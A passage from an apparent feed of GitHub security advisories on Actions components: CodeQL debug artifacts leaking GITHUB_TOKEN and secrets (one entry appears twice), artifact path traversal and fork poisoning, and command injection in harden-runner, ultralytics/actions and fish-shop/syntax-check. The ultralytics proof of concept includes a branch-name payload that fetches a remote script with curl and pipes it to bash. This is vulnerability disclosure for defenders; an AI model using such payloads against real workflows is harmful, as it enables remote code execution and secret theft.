<p>In some circumstances, debug artifacts uploaded by the CodeQL Action after a failed code scanning workflow run may contain the environment variables from the workflow run, including any secrets that were exposed as environment variables to the workflow. Users with read access to the repository would be able to access this artifact, containing any secrets from the environment.</p>
<p>For some affected workflow runs, the exposed environment variables in the debug artifacts included a valid <code>GITHUB_TOKEN</code> for the workflow run, which has access to the repository in which the workflow ran, and all the permissions specified in the workflow or job. The <code>GITHUB_TOKEN</code> is valid until the job completes or 24 hours has elapsed, whichever comes first.</p>
<p>Environment variables are exposed only from workflow runs that satisfy all of the following conditions:</p>
<ul>
<li>Code scanning workflow configured to scan the Java/Kotlin languages.</li>
<li>Running in a repository containing Kotlin source code.</li>
<li>Running with <a href="https://docs.github.com/en/code-security/code-scanning/troubleshooting-code-scanning/logs-not-detailed-enough">debug artifacts enabled</a>.</li>
<li>Using CodeQL Action versions &lt;= 3.28.2, and CodeQL CLI versions &gt;= 2.9.2 (May 2022) and &lt;= 2.20.2.</li>
<li>The workflow run fails before the CodeQL database is finalized within the <code>github/codeql-action/analyze</code> step.</li>
<li>Running in any GitHub environment: GitHub.com, GitHub Enterprise Cloud, and GitHub Enterprise Server. (Note: artifacts are only accessible to users within the same GitHub environment with access to the scanned repo.)</li>
</ul>
<p>The <code>GITHUB_TOKEN</code> exposed in this way would only have been valid for workflow runs that satisfy all of the following conditions, in addition to the conditions above:</p>
<ul>
<li>Using CodeQL Action versions &gt;= 3.26.11 (October 2024) and &lt;= 3.28.2, or &gt;= 2.26.11 and &lt; 3.</li>
<li>Running in GitHub.com or GitHub Enterprise Cloud only (not valid on GitHub Enterprise Server).</li>
</ul>
<p>In rare cases during advanced setup, logging of environment variables may also occur during database creation of Java, Swift, and C/C++. Please read the corresponding CodeQL CLI advisory <a href="https://github.com/github/codeql-cli-binaries/security/advisories/GHSA-gqh3-9prg-j95m">GHSA-gqh3-9prg-j95m</a> for more details.</p>
<h3 id="impact-details">Impact details</h3>
<p>In CodeQL CLI versions &gt;= 2.9.2 and &lt;= 2.20.2, the CodeQL Kotlin extractor logs all environment variables by default into an intermediate file during the process of creating a CodeQL database for Kotlin code. 
This is a part of the CodeQL CLI and is invoked by the CodeQL Action for analyzing Kotlin repositories. 
On Actions, the environment variables logged include GITHUB_TOKEN, which grants permissions to the repository being scanned.</p>
<p>The intermediate file containing environment variables is deleted when finalizing the database, so it is not included in a successfully created database. It is, however, included in the debug artifact that is uploaded on a failed analysis run if the CodeQL Action was invoked in debug mode.</p>
<p>Therefore, under these specific circumstances (incomplete database creation using the CodeQL Action in debug mode) an attacker with access to the debug artifact would gain unauthorized access to repository secrets from the environment, including both the <code>GITHUB_TOKEN</code> and any user-configured secrets made available via environment variables.</p>
<p>The impact of the <code>GITHUB_TOKEN</code> leaked in this environment is limited:</p>
<ul>
<li>For workflows on GitHub.com and GitHub Enterprise Cloud using CodeQL Action versions &gt;= 3.26.11 and &lt;= 3.28.2, or &gt;= 2.26.11 and &lt; 3, which in turn use the <code>actions/artifacts v4</code> library, the debug artifact is uploaded before the workflow job completes. During this time the <code>GITHUB_TOKEN</code> is still valid, providing an opportunity for attackers to gain access to the repository.</li>
<li>For all other workflows, the debug artifact is uploaded after the workflow job completes, at which point the leaked <code>GITHUB_TOKEN</code> has been revoked and cannot be used to access the repository.</li>
</ul>
<h3 id="mitigations">Mitigations</h3>
<p>Update to CodeQL Action version 3.28.3 or later, or CodeQL CLI version 2.20.3 or later.</p>
<h3 id="patches">Patches</h3>
<p>This vulnerability has been fixed in CodeQL Action version 3.28.3, which no longer uploads database artifacts in debug mode.
This vulnerability will be fixed in CodeQL CLI version 2.20.3, in which database creation for all languages no longer logs the complete environment by default.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/github/codeql-action/pull/1074">Pull request that bundled CodeQL CLI 2.9.2 with Kotlin extractor environment variable logging </a></li>
<li><a href="https://github.com/github/codeql-action/pull/2482">Pull request that introduced the <code>actions/artifacts v4</code> library, allowing for <code>GITHUB_TOKEN</code> exposure in the CodeQL Action debug artifacts before the token was revoked</a></li>
<li><a href="https://github.com/github/codeql-cli-binaries/security/advisories/GHSA-gqh3-9prg-j95m">Related security advisory for the CodeQL CLI</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/github/codeql-action/security/advisories/GHSA-vqf5-2xx6-9wfm">https://github.com/github/codeql-action/security/advisories/GHSA-vqf5-2xx6-9wfm</a></li>
<li><a href="https://github.com/github/codeql-cli-binaries/security/advisories/GHSA-gqh3-9prg-j95m">https://github.com/github/codeql-cli-binaries/security/advisories/GHSA-gqh3-9prg-j95m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24362">https://nvd.nist.gov/vuln/detail/CVE-2025-24362</a></li>
<li><a href="https://github.com/github/codeql-action/pull/1074">https://github.com/github/codeql-action/pull/1074</a></li>
<li><a href="https://github.com/github/codeql-action/pull/2482">https://github.com/github/codeql-action/pull/2482</a></li>
<li><a href="https://github.com/github/codeql-action/commit/519de26711ecad48bde264c51e414658a82ef3fa">https://github.com/github/codeql-action/commit/519de26711ecad48bde264c51e414658a82ef3fa</a></li>
<li><a href="https://docs.github.com/en/code-security/code-scanning/troubleshooting-code-scanning/logs-not-detailed-enough">https://docs.github.com/en/code-security/code-scanning/troubleshooting-code-scanning/logs-not-detailed-enough</a></li>
<li><a href="https://news.ycombinator.com/item?id=43527044">https://news.ycombinator.com/item?id=43527044</a></li>
<li><a href="https://www.praetorian.com/blog/codeqleaked-public-secrets-exposure-leads-to-supply-chain-attack-on-github-codeql">https://www.praetorian.com/blog/codeqleaked-public-secrets-exposure-leads-to-supply-chain-attack-on-github-codeql</a></li>
<li><a href="https://github.com/advisories/GHSA-vqf5-2xx6-9wfm">https://github.com/advisories/GHSA-vqf5-2xx6-9wfm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vqf5-2xx6-9wfm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-24T18:44:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github/codeql-action] GitHub PAT written to debug artifacts]]></title>
        <id>https://github.com/advisories/GHSA-vqf5-2xx6-9wfm</id>
        <link href="https://github.com/advisories/GHSA-vqf5-2xx6-9wfm"/>
        <updated>2025-03-31T21:55:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact-summary">Impact summary</h3>
<p>In some circumstances, debug artifacts uploaded by the CodeQL Action after a failed code scanning workflow run may contain the environment variables from the workflow run, including any secrets that were exposed as environment variables to the workflow. Users with read access to the repository would be able to access this artifact, containing any secrets from the environment.</p>
<p>For some affected workflow runs, the exposed environment variables in the debug artifacts included a valid <code>GITHUB_TOKEN</code> for the workflow run, which has access to the repository in which the workflow ran, and all the permissions specified in the workflow or job. The <code>GITHUB_TOKEN</code> is valid until the job completes or 24 hours has elapsed, whichever comes first.</p>
<p>Environment variables are exposed only from workflow runs that satisfy all of the following conditions:</p>
<ul>
<li>Code scanning workflow configured to scan the Java/Kotlin languages.</li>
<li>Running in a repository containing Kotlin source code.</li>
<li>Running with <a href="https://docs.github.com/en/code-security/code-scanning/troubleshooting-code-scanning/logs-not-detailed-enough">debug artifacts enabled</a>.</li>
<li>Using CodeQL Action versions &lt;= 3.28.2, and CodeQL CLI versions &gt;= 2.9.2 (May 2022) and &lt;= 2.20.2.</li>
<li>The workflow run fails before the CodeQL database is finalized within the <code>github/codeql-action/analyze</code> step.</li>
<li>Running in any GitHub environment: GitHub.com, GitHub Enterprise Cloud, and GitHub Enterprise Server. (Note: artifacts are only accessible to users within the same GitHub environment with access to the scanned repo.)</li>
</ul>
<p>The <code>GITHUB_TOKEN</code> exposed in this way would only have been valid for workflow runs that satisfy all of the following conditions, in addition to the conditions above:</p>
<ul>
<li>Using CodeQL Action versions &gt;= 3.26.11 (October 2024) and &lt;= 3.28.2, or &gt;= 2.26.11 and &lt; 3.</li>
<li>Running in GitHub.com or GitHub Enterprise Cloud only (not valid on GitHub Enterprise Server).</li>
</ul>
<p>In rare cases during advanced setup, logging of environment variables may also occur during database creation of Java, Swift, and C/C++. Please read the corresponding CodeQL CLI advisory <a href="https://github.com/github/codeql-cli-binaries/security/advisories/GHSA-gqh3-9prg-j95m">GHSA-gqh3-9prg-j95m</a> for more details.</p>
<h3 id="impact-details">Impact details</h3>
<p>In CodeQL CLI versions &gt;= 2.9.2 and &lt;= 2.20.2, the CodeQL Kotlin extractor logs all environment variables by default into an intermediate file during the process of creating a CodeQL database for Kotlin code. 
This is a part of the CodeQL CLI and is invoked by the CodeQL Action for analyzing Kotlin repositories. 
On Actions, the environment variables logged include GITHUB_TOKEN, which grants permissions to the repository being scanned.</p>
<p>The intermediate file containing environment variables is deleted when finalizing the database, so it is not included in a successfully created database. It is, however, included in the debug artifact that is uploaded on a failed analysis run if the CodeQL Action was invoked in debug mode.</p>
<p>Therefore, under these specific circumstances (incomplete database creation using the CodeQL Action in debug mode) an attacker with access to the debug artifact would gain unauthorized access to repository secrets from the environment, including both the <code>GITHUB_TOKEN</code> and any user-configured secrets made available via environment variables.</p>
<p>The impact of the <code>GITHUB_TOKEN</code> leaked in this environment is limited:</p>
<ul>
<li>For workflows on GitHub.com and GitHub Enterprise Cloud using CodeQL Action versions &gt;= 3.26.11 and &lt;= 3.28.2, or &gt;= 2.26.11 and &lt; 3, which in turn use the <code>actions/artifacts v4</code> library, the debug artifact is uploaded before the workflow job completes. During this time the <code>GITHUB_TOKEN</code> is still valid, providing an opportunity for attackers to gain access to the repository.</li>
<li>For all other workflows, the debug artifact is uploaded after the workflow job completes, at which point the leaked <code>GITHUB_TOKEN</code> has been revoked and cannot be used to access the repository.</li>
</ul>
<h3 id="mitigations">Mitigations</h3>
<p>Update to CodeQL Action version 3.28.3 or later, or CodeQL CLI version 2.20.3 or later.</p>
<h3 id="patches">Patches</h3>
<p>This vulnerability has been fixed in CodeQL Action version 3.28.3, which no longer uploads database artifacts in debug mode.
This vulnerability will be fixed in CodeQL CLI version 2.20.3, in which database creation for all languages no longer logs the complete environment by default.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/github/codeql-action/pull/1074">Pull request that bundled CodeQL CLI 2.9.2 with Kotlin extractor environment variable logging </a></li>
<li><a href="https://github.com/github/codeql-action/pull/2482">Pull request that introduced the <code>actions/artifacts v4</code> library, allowing for <code>GITHUB_TOKEN</code> exposure in the CodeQL Action debug artifacts before the token was revoked</a></li>
<li><a href="https://github.com/github/codeql-cli-binaries/security/advisories/GHSA-gqh3-9prg-j95m">Related security advisory for the CodeQL CLI</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/github/codeql-action/security/advisories/GHSA-vqf5-2xx6-9wfm">https://github.com/github/codeql-action/security/advisories/GHSA-vqf5-2xx6-9wfm</a></li>
<li><a href="https://github.com/github/codeql-cli-binaries/security/advisories/GHSA-gqh3-9prg-j95m">https://github.com/github/codeql-cli-binaries/security/advisories/GHSA-gqh3-9prg-j95m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24362">https://nvd.nist.gov/vuln/detail/CVE-2025-24362</a></li>
<li><a href="https://github.com/github/codeql-action/pull/1074">https://github.com/github/codeql-action/pull/1074</a></li>
<li><a href="https://github.com/github/codeql-action/pull/2482">https://github.com/github/codeql-action/pull/2482</a></li>
<li><a href="https://github.com/github/codeql-action/commit/519de26711ecad48bde264c51e414658a82ef3fa">https://github.com/github/codeql-action/commit/519de26711ecad48bde264c51e414658a82ef3fa</a></li>
<li><a href="https://docs.github.com/en/code-security/code-scanning/troubleshooting-code-scanning/logs-not-detailed-enough">https://docs.github.com/en/code-security/code-scanning/troubleshooting-code-scanning/logs-not-detailed-enough</a></li>
<li><a href="https://news.ycombinator.com/item?id=43527044">https://news.ycombinator.com/item?id=43527044</a></li>
<li><a href="https://www.praetorian.com/blog/codeqleaked-public-secrets-exposure-leads-to-supply-chain-attack-on-github-codeql">https://www.praetorian.com/blog/codeqleaked-public-secrets-exposure-leads-to-supply-chain-attack-on-github-codeql</a></li>
<li><a href="https://github.com/advisories/GHSA-vqf5-2xx6-9wfm">https://github.com/advisories/GHSA-vqf5-2xx6-9wfm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vqf5-2xx6-9wfm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-24T18:44:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[actions/download-artifact] @actions/download-artifact has an Arbitrary File Write via artifact extraction]]></title>
        <id>https://github.com/advisories/GHSA-cxww-7g56-2vh6</id>
        <link href="https://github.com/advisories/GHSA-cxww-7g56-2vh6"/>
        <updated>2025-01-22T17:31:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Versions of <code>actions/download-artifact</code> before 4.1.3 are vulnerable to arbitrary file write when downloading and extracting a specifically crafted artifact that contains path traversal filenames.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to version 4.1.3 or higher. Alternatively use 'v4' tag which points to the latest and secure version.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://snyk.io/research/zip-slip-vulnerability">https://snyk.io/research/zip-slip-vulnerability</a></li>
<li><a href="https://github.com/actions/download-artifact/releases/tag/v4.1.3">https://github.com/actions/download-artifact/releases/tag/v4.1.3</a></li>
<li><a href="https://github.com/actions/download-artifact/pull/299">https://github.com/actions/download-artifact/pull/299</a></li>
</ul>
<h3 id="cve">CVE</h3>
<p>CVE-2024-42471</p>
<h3 id="credits">Credits</h3>
<p>Justin Taft from Google</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/actions/download-artifact/security/advisories/GHSA-cxww-7g56-2vh6">https://github.com/actions/download-artifact/security/advisories/GHSA-cxww-7g56-2vh6</a></li>
<li><a href="https://github.com/advisories/GHSA-6q32-hq47-5qq3">https://github.com/advisories/GHSA-6q32-hq47-5qq3</a></li>
<li><a href="https://snyk.io/research/zip-slip-vulnerability">https://snyk.io/research/zip-slip-vulnerability</a></li>
<li><a href="https://github.com/actions/download-artifact/releases/tag/v4.1.3">https://github.com/actions/download-artifact/releases/tag/v4.1.3</a></li>
<li><a href="https://github.com/advisories/GHSA-cxww-7g56-2vh6">https://github.com/advisories/GHSA-cxww-7g56-2vh6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cxww-7g56-2vh6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-03T20:55:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dawidd6/action-download-artifact] Artifact poisoning vulnerability in action-download-artifact v5 and earlier]]></title>
        <id>https://github.com/advisories/GHSA-5xr6-xhww-33m4</id>
        <link href="https://github.com/advisories/GHSA-5xr6-xhww-33m4"/>
        <updated>2024-11-25T15:26:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>In versions of <code>dawidd6/action-download-artifact</code> before v6, a repository's forks were also searched by default when attempting to find matching artifacts. This could be exploited by an unprivileged attacker to introduce compromised artifacts (such as malicious executables) into a privileged workflow context, as creating a fork requires no privileges.</p>
<p>Users should immediately upgrade to v6 or newer, which changes the default behavior to avoid searching forks for matching artifacts. Users who cannot upgrade should explicitly set <code>allow_forks: false</code> to disable searching forks for artifacts.</p>
<h3 id="details">Details</h3>
<p>GitHub's artifact storage for workflows does not natively distinguish between artifacts created by a repository and artifacts created by forks of that repository. As a result, attempting to retrieve the "latest" artifact for a workflow run can return artifacts produced by a fork, rather than its upstream. </p>
<p>Because any GitHub user can create a fork of a public repository, this allows for artifact poisoning in the following scenarios (as well as potentially others):</p>
<ol>
<li>Repository <code>alice/foo</code> runs <code>build.yml</code>, producing <code>build.exe</code></li>
<li>Repository <code>alice/foo</code> runs <code>publish.yml</code>, which uses <code>action-download-artifact@v5</code> to retrieve the latest <code>build.exe</code> from <code>build.yml</code></li>
</ol>
<p>To compromise <code>publish.yml</code> in this scenario, Mallory forks <code>alice/foo</code> to <code>mallory/foo</code>, and then modifies <code>build.yml</code> to produce a compromised <code>build.exe</code>. Mallory can then repeatedly trigger their copy of <code>build.yml</code> to ensure that their compromised <code>build.exe</code> is always the latest artifact, meaning that Alice's <code>publish.yml</code> will retrieve it.</p>
<p>Additional details on this vulnerability can be found in this blog post from 2022:</p>
<ul>
<li><a href="https://www.legitsecurity.com/blog/artifact-poisoning-vulnerability-discovered-in-rust">https://www.legitsecurity.com/blog/artifact-poisoning-vulnerability-discovered-in-rust</a></li>
</ul>
<h3 id="impact">Impact</h3>
<p>This vulnerability impacts all repositories on GitHub that use <code>action-download-artifacts@v5</code> or older and do <strong>not</strong> disable <code>allow_forks: true</code>, which is the default.</p>
<p>If a repository is affected, the severity ranges from downstream contamination (such as publishing attacker-controlled artifacts) to direct workflow compromise (if the retrieved artifact is then executed in a privileged workflow context, such as <code>push</code> or <code>pull_request_target</code>).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dawidd6/action-download-artifact/security/advisories/GHSA-5xr6-xhww-33m4">https://github.com/dawidd6/action-download-artifact/security/advisories/GHSA-5xr6-xhww-33m4</a></li>
<li><a href="https://github.com/dawidd6/action-download-artifact/commit/bf251b5aa9c2f7eeb574a96ee720e24f801b7c11">https://github.com/dawidd6/action-download-artifact/commit/bf251b5aa9c2f7eeb574a96ee720e24f801b7c11</a></li>
<li><a href="https://www.legitsecurity.com/blog/artifact-poisoning-vulnerability-discovered-in-rust">https://www.legitsecurity.com/blog/artifact-poisoning-vulnerability-discovered-in-rust</a></li>
<li><a href="https://github.com/advisories/GHSA-5xr6-xhww-33m4">https://github.com/advisories/GHSA-5xr6-xhww-33m4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5xr6-xhww-33m4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-11-25T15:26:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[step-security/harden-runner] Harden-Runner has a command injection weaknesses in `setup.ts` and `arc-runner.ts`]]></title>
        <id>https://github.com/advisories/GHSA-g85v-wf27-67xc</id>
        <link href="https://github.com/advisories/GHSA-g85v-wf27-67xc"/>
        <updated>2024-11-19T20:50:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Versions of step-security/harden-runner prior to v2.10.2 contain multiple command injection weaknesses via environment variables that could potentially be exploited under specific conditions. However, due to the current execution order of pre-steps in GitHub Actions and the placement of harden-runner as the first step in a job, the likelihood of exploitation is low as the Harden-Runner action reads the environment variable during the pre-step stage. There are no known exploits at this time. </p>
<h3 id="details">Details</h3>
<ol>
<li><p>setup.ts:169 <a href="https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/setup.ts#L169">1</a>  performs <code>execSync</code> with a command that gets
invoked after interpretation by the shell. This command includes an
interpolated <code>process.env.USER</code> variable, which an attacker could
modify (without actually creating a new user) to inject arbitrary
shell expressions into this <code>execSync</code>. This may or may not be likely
in practice, but I believe the hygienic way to perform the underlying
operation is to use <code>execFileSync</code> or similar and bypass the
underlying shell evaluation.</p>
</li>
<li><p>setup.ts:229 <a href="https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/setup.ts#L229">2</a> has a nearly identical <code>execSync</code> to (1) above,
but with <code>$USER</code> for shell-level interpolation rather than string
interpolation. However, this is still injectable and would be best
replaced by an <code>execFileSync</code>, per above.</p>
</li>
<li><p>arc-runner:40-44 <a href="https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/arc-runner.ts#L40-L44">3</a> has an <code>execSync</code> with multiple string
interpolations. Most of these do not appear immediately injectible
(since they appear to come from presumed trusted API responses), but
the expansion of <code>getRunnerTempDir()</code> may be injectable due to its
dependence on potentially attacker-controllable environment variables
(e.g. <code>RUNNER_TEMP</code>). The underlying operation appears to be a trivial
file copy, so this entire subprocess should in theory be replaceable
with ordinary NodeJS <code>fs</code> API calls instead.</p>
</li>
<li><p>arc-runner:53 <a href="https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/arc-runner.ts#L53">4</a> demonstrates the same weakness, and has the same
resolution as (3).</p>
</li>
<li><p>arc-runner:57 demonstrates the same weakness as (3) and (4), and
has the same resolution.</p>
</li>
<li><p>arc-runner:61 demonstrates the same weakness as (3), (4), and (5),
and has the same resolution.</p>
</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/step-security/harden-runner/security/advisories/GHSA-g85v-wf27-67xc">https://github.com/step-security/harden-runner/security/advisories/GHSA-g85v-wf27-67xc</a></li>
<li><a href="https://github.com/step-security/harden-runner/commit/0080882f6c36860b6ba35c610c98ce87d4e2f26f">https://github.com/step-security/harden-runner/commit/0080882f6c36860b6ba35c610c98ce87d4e2f26f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52587">https://nvd.nist.gov/vuln/detail/CVE-2024-52587</a></li>
<li><a href="https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/arc-runner.ts#L40-L44">https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/arc-runner.ts#L40-L44</a></li>
<li><a href="https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/arc-runner.ts#L53">https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/arc-runner.ts#L53</a></li>
<li><a href="https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/arc-runner.ts#L57">https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/arc-runner.ts#L57</a></li>
<li><a href="https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/arc-runner.ts#L61">https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/arc-runner.ts#L61</a></li>
<li><a href="https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/setup.ts#L169">https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/setup.ts#L169</a></li>
<li><a href="https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/setup.ts#L229">https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/setup.ts#L229</a></li>
<li><a href="https://github.com/advisories/GHSA-g85v-wf27-67xc">https://github.com/advisories/GHSA-g85v-wf27-67xc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g85v-wf27-67xc</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-11-18T23:48:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ultralytics/actions] GitHub Actions Script Injection in `ultralytics/actions`]]></title>
        <id>https://github.com/advisories/GHSA-7x29-qqmq-v6qc</id>
        <link href="https://github.com/advisories/GHSA-7x29-qqmq-v6qc"/>
        <updated>2024-11-18T16:27:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Ultralytics action available at <a href="https://github.com/marketplace/actions/ultralytics-actions">https://github.com/marketplace/actions/ultralytics-actions</a> is vulnerable to GitHub Actions script injection. If anyone uses the action within a workflow that runs on the <code>pull_request_target</code> trigger, then an attacker can inject arbitrary code into that workflow using a crafted branch name.</p>
<h3 id="details">Details</h3>
<p>The issue exists because the <code>action.yml</code> is a composite action and uses certain fields by GitHub context expression within a <code>run</code> step:</p>
<pre><code>        echo "github.event.pull_request.head.ref: ${{ github.event.pull_request.head.ref }}"
        echo "github.ref: ${{ github.ref }}"
        echo "github.head_ref: ${{ github.head_ref }}"
        echo "github.base_ref: ${{ github.base_ref }}"
</code></pre>
<p>In this case, <code>github.head_ref</code> and <code>github.event.pull_request.head.ref</code> are user controlled and can be used to inject code.</p>
<h3 id="poc">PoC</h3>
<ol>
<li><p>Create a fork of any repository that uses <code>ultralytics/actions</code> within a workflow that runs on <code>pull_request_target</code>.</p>
</li>
<li><p>In the fork create a branch as an injection payload, e.g.: <code>Hacked";{curl,-sSfL,gist.githubusercontent.com/RampagingSloth/6dc549d083b2da1a54d22cc4feac53a4/raw/4b7499772c53085aeedf459d822aee277b5f17a0/poc.sh}${IFS}|${IFS}bash</code></p>
</li>
<li><p>Create a draft pull request.</p>
</li>
<li><p>If the action is reachable, then achieve arbitrary code execution.</p>
</li>
</ol>
<p><img alt="ultra_cve_poc" src="https://github.com/ultralytics/actions/assets/2006441/b865a54c-38b5-451c-8e93-c497ad6874a2"></p>
<p>See my full POC here (<a href="https://github.com/AdnaneKhan/Ultralytics_POC/actions/runs/9733997201">https://github.com/AdnaneKhan/Ultralytics_POC/actions/runs/9733997201</a> and <a href="https://github.com/AdnaneKhan/Ultralytics_POC">https://github.com/AdnaneKhan/Ultralytics_POC</a>), where I created a test workflow that used the action and achieved arbitrary execution using another account by creating a pull request from a fork.</p>
<h3 id="impact">Impact</h3>
<p>Any workflow that uses the action and runs on <code>pull_request_target</code> is vulnerable to arbitrary code execution within the context of the base branch. An attacker can use this to abuse the <code>GITHUB_TOKEN</code> or steal secrets from the workflow.</p>
<h3 id="fix">Fix</h3>
<p>Sanitize the user-controlled variables using environment vars.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ultralytics/actions/security/advisories/GHSA-7x29-qqmq-v6qc">https://github.com/ultralytics/actions/security/advisories/GHSA-7x29-qqmq-v6qc</a></li>
<li><a href="https://github.com/ultralytics/actions/commit/8069e0ac4c23170f308ea6985783e64ca4a7900a">https://github.com/ultralytics/actions/commit/8069e0ac4c23170f308ea6985783e64ca4a7900a</a></li>
<li><a href="https://github.com/advisories/GHSA-7x29-qqmq-v6qc">https://github.com/advisories/GHSA-7x29-qqmq-v6qc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7x29-qqmq-v6qc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-14T20:53:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fish-shop/syntax-check] fish-shop/syntax-check Improper Neutralization of Delimiters]]></title>
        <id>https://github.com/advisories/GHSA-xj87-mqvh-88w2</id>
        <link href="https://github.com/advisories/GHSA-xj87-mqvh-88w2"/>
        <updated>2024-08-12T19:17:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Improper neutralisation of delimiters in the <code>pattern</code> input (specifically the command separator <code>;</code> and command substitution characters <code>(</code> and <code>)</code>) mean that arbitrary command injection is possible by modification of the input value used in a workflow. This has the potential for exposure or exfiltration of sensitive information from the workflow runner, such as might be achieved by sending environment variables to an external entity.</p>
<h3 id="patches">Patches</h3>
<p>As of this writing, the issue has been patched for versions in the <code>v1.x.x</code> release series in release <code>v1.6.12</code> (also tagged as <code>v1.6</code> and <code>v1</code>). The latest available release <code>v2.0.0</code> also includes a corresponding patch (also tagged as <code>v2.0</code> and <code>v2</code>).</p>
<p>Users should upgrade to at least the patched version <code>v1.6.12</code> or preferably the latest available version <code>v2.0.0</code>. Workflows that use the action ref <code>v1</code> will automatically receive the patched version <code>v1.6.12</code> in future workflow runs.</p>
<p>Patch summary:</p>
<table>
<thead>
<tr>
<th>Release series</th>
<th>Patched tags</th>
<th>Patched commit hashes</th>
</tr>
</thead>
<tbody><tr>
<td><code>1.x.x</code></td>
<td><code>v1.6.12</code>, <code>v1.6</code>, <code>v1</code></td>
<td><code>91e6817c48ad475542fe4e78139029b036a53b03</code></td>
</tr>
<tr>
<td><code>2.x.x</code></td>
<td><code>v2.0.0</code>, <code>v2.0</code>, <code>v2</code></td>
<td><code>c2cb11395e21119ff8d6e7ea050430ee7d6f49ca</code></td>
</tr>
</tbody></table>
<h3 id="workarounds">Workarounds</h3>
<p>Is it recommended that users update to the patched version <code>v1.6.12</code> or the latest release version <code>v2.0.0</code>, however remediation may be possible through careful control of workflows and the <code>pattern</code> input value used by this action.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/140.html">CWE-140: Improper Neutralization of Delimiters</a></li>
<li><a href="https://capec.mitre.org/data/definitions/15.html">CAPEC-15: Command Delimiters</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/fish-shop/syntax-check/security/advisories/GHSA-xj87-mqvh-88w2">https://github.com/fish-shop/syntax-check/security/advisories/GHSA-xj87-mqvh-88w2</a></li>
<li><a href="https://github.com/fish-shop/syntax-check/commit/91e6817c48ad475542fe4e78139029b036a53b03">https://github.com/fish-shop/syntax-check/commit/91e6817c48ad475542fe4e78139029b036a53b03</a></li>
<li><a href="https://github.com/fish-shop/syntax-check/commit/c2cb11395e21119ff8d6e7ea050430ee7d6f49ca">https://github.com/fish-shop/syntax-check/commit/c2cb11395e21119ff8d6e7ea050430ee7d6f49ca</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42482">https://nvd.nist.gov/vuln/detail/CVE-2024-42482</a></li>
<li><a href="https://github.com/advisories/GHSA-xj87-mqvh-88w2">https://github.com/advisories/GHSA-xj87-mqvh-88w2</a></li>
</ul>
